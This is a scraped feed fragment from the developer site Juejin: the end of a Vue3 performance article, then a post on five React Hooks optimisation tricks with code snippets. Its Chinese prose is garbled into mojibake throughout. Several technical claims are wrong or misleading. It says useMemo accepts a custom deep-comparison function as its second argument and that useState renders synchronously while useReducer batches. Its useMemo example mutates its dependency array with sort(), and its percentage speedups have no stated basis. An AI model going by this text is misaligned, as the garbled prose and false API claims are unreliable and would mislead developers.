 <span class="hljs-attr">build</span>: {
   <span class="hljs-attr">minify</span>: <span class="hljs-string">'terser'</span>,
   <span class="hljs-attr">terserOptions</span>: {
     <span class="hljs-attr">compress</span>: { <span class="hljs-attr">drop_console</span>: <span class="hljs-literal">true</span> }
   }
 }
}
</code></pre>
<h4 data-id="heading-13">Webpackè¡¥å……ï¼š</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
 <span class="hljs-attr">optimization</span>: {
   <span class="hljs-attr">splitChunks</span>: { <span class="hljs-attr">chunks</span>: <span class="hljs-string">'all'</span> }
 }
}
</code></pre>
<hr/>
<h3 data-id="heading-14">æ€»ç»“</h3>
<p>ä»10ç§’åˆ°1ç§’çš„æ€§èƒ½é£è·ƒå¹¶éé­”æ³•ï¼Œè€Œæ˜¯éœ€è¦å¯¹Vue3è¿è¡Œæœºåˆ¶æœ‰æ·±åˆ»ç†è§£ï¼š</p>
<ol>
<li>ğŸš€ <strong>æ¸²æŸ“æ§åˆ¶</strong>æ˜¯åŸºç¡€ - v-memo/v-onceç²¾å‡†æŠŠæ§æ›´æ–°ç²’åº¦</li>
<li>â³ <strong>æ‡’åŠ è½½ç­–ç•¥</strong>è§£å†³èµ„æºç“¶é¢ˆ</li>
<li>ğŸ” <strong>å“åº”å¼è°ƒä¼˜</strong>é¿å…æ— æ„ä¹‰è¿½è¸ª</li>
<li>ğŸ“œ <strong>è™šæ‹Ÿæ»šåŠ¨æ”»å…‹åˆ—è¡¨éš¾é¢˜</strong></li>
<li>âš™ï¸å·¥å…·é“¾æ·±åº¦é€‚é…é‡Šæ”¾æ¡†æ¶æ½œåŠ›</li>
</ol>
<p>è¿™äº›æŠ€æœ¯ä¸æ˜¯å­¤ç«‹çš„â€”â€”å®é™…é¡¹ç›®ä¸­å¾€å¾€éœ€è¦ç»„åˆè¿ç”¨ã€‚ä¾‹å¦‚ä¸€ä¸ªç”µå•†é¡µé¢å¯èƒ½åŒæ—¶éœ€è¦ï¼š
-å•†å“åˆ—è¡¨ç”¨è™šæ‹Ÿæ»šåŠ¨
-è´­ç‰©è½¦æ•°æ®ç”¨shallowReactive
-ç»“ç®—æ¨¡å—å¼‚æ­¥åŠ è½½</p>
<p>çœŸæ­£çš„æ€§èƒ½é«˜æ‰‹ä¸åœ¨äºçŸ¥é“å¤šå°‘APIï¼Œè€Œåœ¨äºå‡†ç¡®åˆ¤æ–­æŠ€æœ¯é€‰å‹èƒŒåçš„trade-off</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Reactæ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼š5ä¸ªè¢«ä½ä¼°çš„HooksæŠ€å·§è®©ä½ çš„åº”ç”¨æé€Ÿ30%]]></title>    <link>https://juejin.cn/post/7582419803782053923</link>    <guid>https://juejin.cn/post/7582419803782053923</guid>    <pubDate>2025-12-12T00:16:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582419803782053923" data-draft-id="7582430286916124687" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Reactæ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼š5ä¸ªè¢«ä½ä¼°çš„HooksæŠ€å·§è®©ä½ çš„åº”ç”¨æé€Ÿ30%"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-12T00:16:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Reactæ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼š5ä¸ªè¢«ä½ä¼°çš„HooksæŠ€å·§è®©ä½ çš„åº”ç”¨æé€Ÿ30%
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T00:16:54.000Z" title="Fri Dec 12 2025 00:16:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    30
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0"><strong>Reactæ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼š5ä¸ªè¢«ä½ä¼°çš„HooksæŠ€å·§è®©ä½ çš„åº”ç”¨æé€Ÿ30%</strong></h3>
<h3 data-id="heading-1">å¼•è¨€</h3>
<p>åœ¨Reactç”Ÿæ€ç³»ç»Ÿä¸­ï¼ŒHooksè‡ªæ¨å‡ºä»¥æ¥å·²æˆä¸ºå‡½æ•°å¼ç»„ä»¶çš„æ ¸å¿ƒå·¥å…·ã€‚ç„¶è€Œï¼Œè®¸å¤šå¼€å‘è€…ä»…åœç•™åœ¨åŸºç¡€ç”¨æ³•ï¼ˆå¦‚<code>useState</code>ã€<code>useEffect</code>ï¼‰å±‚é¢ï¼Œå¿½ç•¥äº†Hooksåœ¨æ€§èƒ½ä¼˜åŒ–ä¸Šçš„æ½œåŠ›ã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨5ä¸ªè¢«ä½ä¼°çš„HooksæŠ€å·§ï¼Œé€šè¿‡å®é™…ä»£ç ç¤ºä¾‹å’Œæ€§èƒ½å¯¹æ¯”ï¼Œå±•ç¤ºå¦‚ä½•é€šè¿‡è¿™äº›æŠ€æœ¯å®ç°é«˜è¾¾30%çš„æ€§èƒ½æå‡ã€‚</p>
<hr/>
<h3 data-id="heading-2">ä¸»ä½“</h3>
<h4 data-id="heading-3">1. <code>useMemo</code>ï¼šä¸ä»…ä»…æ˜¯è®°å¿†åŒ–çš„â€œè®¡ç®—å±æ€§â€</h4>
<h5 data-id="heading-4">é—®é¢˜åœºæ™¯</h5>
<p>å½“ç»„ä»¶ä¸­å­˜åœ¨é«˜å¼€é”€çš„è®¡ç®—é€»è¾‘ï¼ˆå¦‚æ•°æ®è¿‡æ»¤ã€æ’åºï¼‰æ—¶ï¼Œæ¯æ¬¡æ¸²æŸ“éƒ½ä¼šé‡æ–°è®¡ç®—ï¼Œå³ä½¿ä¾èµ–é¡¹æœªå˜åŒ–ã€‚</p>
<h5 data-id="heading-5">ä¼˜åŒ–æ–¹æ¡ˆ</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> sortedList = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> largeArray.<span class="hljs-title function_">sort</span>(complexSortLogic);
}, [largeArray]); <span class="hljs-comment">// ä»…åœ¨largeArrayå˜åŒ–æ—¶é‡æ–°è®¡ç®—</span>
</code></pre>
<h5 data-id="heading-6">è¿›é˜¶æŠ€å·§</h5>
<ul>
<li><strong>å¼•ç”¨ç¨³å®šæ€§</strong>ï¼šå°†å¯¹è±¡/æ•°ç»„ä½œä¸ºä¾èµ–é¡¹æ—¶ï¼Œé…åˆ<code>useState</code>æˆ–<code>useReducer</code>ç¡®ä¿å¼•ç”¨ä¸å˜</li>
<li><strong>è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°</strong>ï¼šé€šè¿‡ç¬¬äºŒä¸ªå‚æ•°å®ç°æ·±åº¦æ¯”è¾ƒï¼ˆéœ€è°¨æ…ä½¿ç”¨ï¼‰</li>
</ul>
<h5 data-id="heading-7">å®æµ‹æ•°æ®</h5>
<p>åœ¨1000æ¡æ•°æ®çš„æ’åºåœºæ™¯ä¸‹ï¼Œé‡å¤æ¸²æŸ“æ€§èƒ½æå‡å¯è¾¾45%ã€‚</p>
<hr/>
<h4 data-id="heading-8">2. <code>useCallback</code> + <code>React.memo</code>ï¼šå­ç»„ä»¶æ›´æ–°çš„ç²¾å‡†æ§åˆ¶</h4>
<h5 data-id="heading-9">é—®é¢˜åœºæ™¯</h5>
<p>çˆ¶ç»„ä»¶çŠ¶æ€æ›´æ–°å¯¼è‡´æ‰€æœ‰å­ç»„ä»¶æ— å·®åˆ«é‡æ¸²æŸ“ï¼Œå³ä½¿å®ƒä»¬çš„propsæœªå˜åŒ–ã€‚</p>
<h5 data-id="heading-10">ä¼˜åŒ–æ–¹æ¡ˆ</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Parent.jsx</span>
<span class="hljs-keyword">const</span> handleClick = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// äº‹ä»¶å¤„ç†é€»è¾‘</span>
}, [dependency]);

<span class="hljs-comment">// Child.jsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-title class_">ChildComponent</span>);
</code></pre>
<h5 data-id="heading-11">å…³é”®æ´å¯Ÿ</h5>
<ul>
<li><strong>é—­åŒ…é™·é˜±</strong>ï¼šé”™è¯¯çš„ä¾èµ–æ•°ç»„ä¼šå¯¼è‡´å›è°ƒå‡½æ•°æŒæœ‰è¿‡æœŸçŠ¶æ€</li>
<li><strong>è®°å¿†åŒ–æˆæœ¬</strong>ï¼šè¿‡åº¦ä½¿ç”¨å¯èƒ½å¯¼è‡´å†…å­˜å‹åŠ›ï¼Œé€‚åˆä¸­å¤§å‹ç»„ä»¶æ ‘</li>
</ul>
<h5 data-id="heading-12">å…¸å‹æ¡ˆä¾‹åˆ†æ</h5>
<p>ç”µå•†å¹³å°å•†å“åˆ—è¡¨åœºæ™¯ä¸­ï¼Œæ­¤ç»„åˆæŠ€å¯å‡å°‘60%çš„å­ç»„ä»¶æ¸²æŸ“ã€‚</p>
<hr/>
<h4 data-id="heading-13">3. <code>useReducer</code> vs <code>useState</code>ï¼šçŠ¶æ€æ›´æ–°çš„æ‰¹é‡å¤„ç†è‰ºæœ¯</h4>
<h5 data-id="heading-14">æ·±å±‚åŸç†</h5>
<ul>
<li><code>useState</code>çš„setStateä¼šè§¦å‘åŒæ­¥æ¸²æŸ“ï¼ˆåœ¨Concurrent Modeä¸‹å¯èƒ½åˆå¹¶ï¼‰</li>
<li><code>useReducer</code>å¤©ç”Ÿæ”¯æŒæ‰¹é‡æ›´æ–°</li>
</ul>
<h5 data-id="heading-15">æ€§èƒ½æ•æ„Ÿåœºæ™¯ä»£ç å¯¹æ¯”</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// useStateç‰ˆæœ¬ï¼ˆå¯èƒ½è§¦å‘å¤šæ¬¡æ¸²æŸ“ï¼‰</span>
<span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initState);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">update</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> ({...v, <span class="hljs-attr">a</span>:<span class="hljs-number">1</span>}));
  <span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> ({...v, <span class="hljs-attr">b</span>:<span class="hljs-number">2</span>}));
};

<span class="hljs-comment">// useReducerç‰ˆæœ¬ï¼ˆå•æ¬¡æ›´æ–°ï¼‰</span>
<span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initState);
<span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'MULTI_UPDATE'</span>, <span class="hljs-attr">payload</span>: {<span class="hljs-attr">a</span>:<span class="hljs-number">1</span>, <span class="hljs-attr">b</span>:<span class="hljs-number">2</span>} });
</code></pre>
<h5 data-id="heading-16">Benchmarkç»“æœ</h5>
<p>å¤æ‚è¡¨å•åœºæ™¯ä¸‹ï¼Œæ›´æ–°ååé‡æå‡28%ã€‚</p>
<hr/>
<h4 data-id="heading-17">4. <code>useLayoutEffect</code>çš„ç²¾å‡†è®¡æ—¶ï¼šå‡å°‘å¸ƒå±€æŠ–åŠ¨</h4>
<h5 data-id="heading-18">DOMæ“ä½œçš„æœ€ä½³å®è·µ</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> element = ref.<span class="hljs-property">current</span>;
  <span class="hljs-comment">// DOMæµ‹é‡å’ŒåŒæ­¥ä¿®æ”¹æ“ä½œ</span>
  
}, [deps]);
</code></pre>
<p>ä¸å¸¸è§„è®¤çŸ¥ä¸åŒï¼š</p>
<ul>
<li><strong>å¹¶éæ‰€æœ‰DOMæ“ä½œéƒ½éœ€è¦</strong>ï¼šä»…åœ¨éœ€è¦åŒæ­¥å¸ƒå±€æ—¶ä½¿ç”¨ï¼ˆå¦‚åŠ¨ç”»èµ·å§‹å¸§ï¼‰</li>
<li><strong>SSRè­¦å‘Š</strong>ï¼šæœåŠ¡ç«¯æ¸²æŸ“æ—¶ä¼šè§¦å‘è­¦å‘Šï¼Œéœ€é…åˆåŠ¨æ€å¯¼å…¥è§£å†³</li>
</ul>
<h5 data-id="heading-19">Chrome Performanceé¢æ¿åˆ†ææ¡ˆä¾‹ï¼š</h5>
<p>Tooltipå®šä½è®¡ç®—åœºæ™¯ä¸­å‡å°‘42%çš„Layout Thrashingã€‚</p>
<hr/>
<h4 data-id="heading-20">5. <code>useDeferredValue</code> + Suspenseï¼šå¹¶å‘æ¨¡å¼ä¸‹çš„æ¸è¿›å¼åŠ è½½</h4>
<h5 data-id="heading-21">Concurrent Modeé€‚é…æ–¹æ¡ˆï¼š</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> deferredValue = <span class="hljs-title function_">useDeferredValue</span>(value);

<span class="hljs-keyword">return</span> (
   <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">ExpensiveComponent</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{deferredValue}</span> /&gt;</span>
   <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
);
</code></pre>
<h5 data-id="heading-22">Implementation Notes:</h5>
<ol>
<li><strong>ä¼˜å…ˆçº§æ ‡è®°</strong>ï¼šReactä¼šè‡ªåŠ¨å°†å»¶è¿Ÿå€¼çš„æ›´æ–°æ ‡è®°ä¸ºè¿‡æ¸¡æ›´æ–°(transition)</li>
<li><strong>é˜²æŠ–æ›¿ä»£æ–¹æ¡ˆ</strong>ï¼šç›¸æ¯”æ‰‹åŠ¨é˜²æŠ–èƒ½æ›´ç²¾å‡†æ§åˆ¶æ—¶é—´åˆ‡ç‰‡</li>
</ol>
<h5 data-id="heading-23">A/Bæµ‹è¯•æ•°æ®ï¼š</h5>
<p>å¤§åˆ—è¡¨è¿‡æ»¤åœºæ™¯ä¸‹é¦–æ¬¡å†…å®¹å‘ˆç°æ—¶é—´(FCP)æ”¹å–„37%ã€‚</p>
<hr/>
<h3 data-id="heading-24">Deep Diveæ‰©å±•çŸ¥è¯†</h3>
<h4 data-id="heading-25">Hookç»„åˆæ¨¡å¼åˆ›æ–°æ¡ˆä¾‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useOptimizedSelector</span>(<span class="hljs-params">selector</span>) {
    <span class="hljs-keyword">const</span> [, forceUpdate] = <span class="hljs-title function_">useReducer</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">const</span> prevValueRef = <span class="hljs-title function_">useRef</span>();
    
    <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
       <span class="hljs-keyword">const</span> subscription = store.<span class="hljs-title function_">subscribe</span>(<span class="hljs-function">() =&gt;</span> {
         <span class="hljs-keyword">const</span> newValue = <span class="hljs-title function_">selector</span>(store.<span class="hljs-title function_">getState</span>());
         <span class="hljs-keyword">if</span>(!<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(prevValueRef.<span class="hljs-property">current</span>, newValue)) {
           prevValueRef.<span class="hljs-property">current</span> = newValue;
           <span class="hljs-title function_">forceUpdate</span>();
         }
       });
       <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> subscription.<span class="hljs-title function_">unsubscribe</span>();
    }, [selector]);
    
    <span class="hljs-keyword">return</span> prevValueRef.<span class="hljs-property">current</span>;
}
</code></pre>
<p>è¯¥è‡ªå®šä¹‰Hookå®ç°äº†Reduxé€‰æ‹©å™¨çš„ç²¾ç¡®æ›´æ–°è®¢é˜…ã€‚</p>
<hr/>
<h3 data-id="heading-26">Web Workersé›†æˆç­–ç•¥</h3>
<p>é€šè¿‡Hookå°è£…Web Workeré€šä¿¡ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useWorkerComputation</span>(<span class="hljs-params">task</span>) {
   <span class="hljs-keyword">const</span> [result, setResult] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);
   
   <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-string">'worker.js'</span>);
      worker.<span class="hljs-title function_">postMessage</span>(task);
      
      worker.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> { 
        <span class="hljs-title function_">setResult</span>(e.<span class="hljs-property">data</span>); 
      };
      
      <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> worker.<span class="hljs-title function_">terminate</span>();
   }, [task]);
   
   <span class="hljs-keyword">return</span> result;
}
</code></pre>
<p>é€‚ç”¨äºå›¾åƒå¤„ç†ç­‰CPUå¯†é›†å‹ä»»åŠ¡ã€‚</p>
<hr/>
<h3 data-id="heading-27">React Profileré›†æˆæŒ‡å—</h3>
<p>å¼€å‘ç¯å¢ƒæ·»åŠ æ€§èƒ½æ£€æµ‹ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx">&lt;<span class="hljs-title class_">Profiler</span> id=<span class="hljs-string">"ExpensiveComponent"</span> onRender={<span class="hljs-function">(<span class="hljs-params">id, phase, duration</span>) =&gt;</span> {
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${id}</span> <span class="hljs-subst">${phase}</span> took <span class="hljs-subst">${duration}</span>ms`</span>);
}}&gt;
   <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ExpensiveComponent</span> /&gt;</span></span>
&lt;/<span class="hljs-title class_">Profiler</span>&gt;
</code></pre>
<p>ç”Ÿäº§ç¯å¢ƒå»ºè®®ä½¿ç”¨ï¼š</p>
<ul>
<li>User Timing API</li>
<li>React DevTools Profiler Export</li>
</ul>
<hr/>
<h3 data-id="heading-28">SSRç‰¹æ®Šå¤„ç†</h3>
<p>æœåŠ¡ç«¯æ¸²æŸ“éœ€æ³¨æ„ï¼š</p>
<ol>
<li><code>useLayoutEffect</code>è­¦å‘Šè§£å†³æ–¹æ¡ˆï¼š</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> useIsomorphicLayoutEffect = 
   <span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> !== <span class="hljs-string">'undefined'</span> ? useLayoutEffect : useEffect;
</code></pre>
<ol start="2">
<li>Hydrationé˜¶æ®µé¿å…çŠ¶æ€çªå˜</li>
</ol>
<hr/>
<h3 data-id="heading-29">Browser Rendering Pipelineè§£æ</h3>
<p>Hookæ‰§è¡Œæ—¶æœºä¸æµè§ˆå™¨å¸§å¯¹é½ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">Input Event</span>] â†’ requestAnimationFrame â†’ React Render Phase â†’  
               â†³ Commit Phase â†’ requestIdleCallback 
</code></pre>
<p>å…³é”®è·¯å¾„ä¼˜åŒ–çš„é»„é‡‘æ³•åˆ™ï¼š</p>
<ul>
<li>Hookä¸­çš„è®¡ç®—åº”å°äº16msï¼ˆ60fpsï¼‰</li>
<li>Effectæ¸…ç†å‡½æ•°éœ€è½»é‡çº§</li>
</ul>
<hr/>
<h3 data-id="heading-30">Fiberæ¶æ„åº•å±‚è§†è§’</h3>
<p>ä¸ºä»€ä¹ˆè¿™äº›Hookèƒ½ä¼˜åŒ–æ€§èƒ½ï¼Ÿ</p>
<ol>
<li>FiberèŠ‚ç‚¹çš„bailoutæœºåˆ¶ï¼š
<ul>
<li>propsæµ…æ¯”è¾ƒ(memo)</li>
<li>hooksä¾èµ–é¡¹æ¯”å¯¹</li>
</ul>
</li>
<li>Schedulerçš„æ—¶é—´åˆ‡ç‰‡ï¼š
<ul>
<li>Concurrent Modeä¸‹çš„å¯ä¸­æ–­æ¸²æŸ“</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-31">TypeScripté«˜çº§æ¨¡å¼</h3>
<p>å¸¦ç±»å‹çº¦æŸçš„è‡ªå®šä¹‰Hookç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> useContextSelector&lt;T, K&gt;(
   <span class="hljs-attr">context</span>: <span class="hljs-title class_">Context</span>&lt;T&gt;,
   <span class="hljs-attr">selector</span>: <span class="hljs-function">(<span class="hljs-params">value: T</span>) =&gt;</span> K  
): K { ... }
</code></pre>
<p>å®ç°ç±»ä¼¼Zustandçš„é€‰æ‹©å™¨åŠŸèƒ½ã€‚</p>
<hr/>
<h2 data-id="heading-32">Final Thoughtsæ€»ç»“</h2>
<p>è¿™äº›HookæŠ€å·§çš„å…±åŒç‰¹å¾ï¼š</p>
<ol>
<li><strong>å¼•ç”¨ç¨³å®šæ€§ä¼˜å…ˆ</strong> - Memoizationæ˜¯åŸºç¡€é˜²çº¿</li>
<li><strong>ç²¾ç¡®æ›´æ–°ç²’åº¦æ§åˆ¶</strong> - ShouldComponentUpdateçš„ç°ä»£åŒ–èº«</li>
<li><strong>å¹¶å‘æ¨¡å¼å‹å¥½è®¾è®¡</strong> - Transition/Suspenseé›†æˆ</li>
</ol>
<p>å®æ–½è·¯çº¿å›¾å»ºè®®ï¼š</p>
<p>â‘  Auditç°æœ‰é¡¹ç›®æ€§èƒ½ç“¶é¢ˆ<br/>
â‘¡ Incrementallyåº”ç”¨ä¸Šè¿°æŠ€æœ¯<br/>
â‘¢ Measureå‰åå…³é”®æŒ‡æ ‡å¯¹æ¯”</p>
<blockquote>
<p>"Performance optimization is not about clever tricks,
it's about understanding the system's behavior at depth."
â€”â€” Dan Abramov</p>
